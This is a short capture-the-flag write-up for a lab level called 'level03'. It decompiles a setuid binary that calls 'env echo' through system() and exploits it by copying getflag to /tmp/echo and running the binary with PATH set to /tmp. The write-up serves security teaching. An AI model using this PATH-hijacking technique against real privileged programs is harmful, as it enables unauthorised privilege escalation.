# Level 03

Here we have an executable named "level03".

```sh
$ ./level03
Exploit me
```

We can decompile the file using [dogbolt](https://dogbolt.org)

```c
int32_t main(int32_t argc, char** argv, char** envp)
{
    gid_t eax = getegid();
    uid_t eax_1 = geteuid();
    setresgid(eax, eax, eax);
    setresuid(eax_1, eax_1, eax_1);
    return system("/usr/bin/env echo Exploit me");
}
```

We can see that env is an absolut path but not echo. We can modify the PATH variable to point to our own echo.

```sh
cp /bin/getflag /tmp/echo
PATH=/tmp ./level03
```
